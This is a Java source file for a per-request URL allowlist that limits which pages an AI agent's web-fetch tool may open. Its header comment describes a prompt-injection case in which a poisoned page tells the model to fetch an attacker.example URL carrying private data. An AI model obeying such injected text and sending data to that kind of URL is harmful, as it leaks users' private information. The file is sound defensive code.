package com.agentsystem.webfetch.service;

import org.springframework.stereotype.Component;

import java.util.Collection;
import java.util.HashSet;
import java.util.Set;

/**
 * Per-request set of URLs that {@code fetchWebPage} may open — closes the prompt-injection
 * exfiltration channel (a page or poisoned document telling the model to fetch
 * {@code https://attacker.example/?d=<private data>}).
 *
 * A URL is allowed only if it came from somewhere the model can't author:
 *  - the user's own message or earlier user turns (seeded by GeneratorNode),
 *  - a searchWeb result returned earlier in the same request, or
 *  - a searchWeb result returned in an earlier turn of the same conversation (hashes loaded
 *    from {@link ConversationFetchUrlService} by GeneratorNode, which also persists this
 *    request's results via {@link #searchResultUrls()} before the scope is cleared).
 * Redirects from an allowed URL are followed by the browser. Links found inside fetched
 * pages, and URLs in assistant turns, are deliberately NOT added.
 *
 * Scoped via ThreadLocal like {@link com.agentsystem.agent.ToolCallBudget}: primed and
 * cleared on GenerationService's worker thread, where the tool-calling loop runs.
 * Not primed means nothing is allowed (deny by default).
 */
@Component
public class WebFetchUrlAllowlist {

    /** Normalized URLs allowed this request, earlier-turn hashes, and this request's search results. */
    private record Scope(Set<String> allowed, Set<String> priorSearchHashes, Set<String> searchResults) {}

    private static final ThreadLocal<Scope> SCOPE = new ThreadLocal<>();

    /** Starts a new request scope, allowing every URL found in {@code userTexts}. */
    public void reset(Iterable<String> userTexts) {
        reset(userTexts, Set.of());
    }

    /**
     * Starts a new request scope, allowing every URL found in {@code userTexts} plus every URL
     * whose {@link UrlNormalizer#hash} is in {@code priorSearchHashes}.
     */
    public void reset(Iterable<String> userTexts, Collection<String> priorSearchHashes) {
        Set<String> allowed = new HashSet<>();
        for (String text : userTexts) {
            for (String url : UrlNormalizer.extractUrls(text)) {
                String key = UrlNormalizer.normalize(url);
                if (key != null) allowed.add(key);
            }
        }
        SCOPE.set(new Scope(allowed, Set.copyOf(priorSearchHashes), new HashSet<>()));
    }

    public void clear() {
        SCOPE.remove();
    }

    /** Allows searchWeb result {@code url} for the rest of the current request (no-op outside a request scope). */
    public void allow(String url) {
        Scope scope = SCOPE.get();
        String key = UrlNormalizer.normalize(url);
        if (scope != null && key != null) {
            scope.allowed().add(key);
            scope.searchResults().add(key);
        }
    }

    /** Normalized URLs passed to {@link #allow} in the current request; empty outside a request scope. */
    public Set<String> searchResultUrls() {
        Scope scope = SCOPE.get();
        return scope == null ? Set.of() : Set.copyOf(scope.searchResults());
    }

    public boolean isAllowed(String url) {
        Scope scope = SCOPE.get();
        String key = UrlNormalizer.normalize(url);
        if (scope == null || key == null) return false;
        return scope.allowed().contains(key) || scope.priorSearchHashes().contains(UrlNormalizer.hash(key));
    }
}
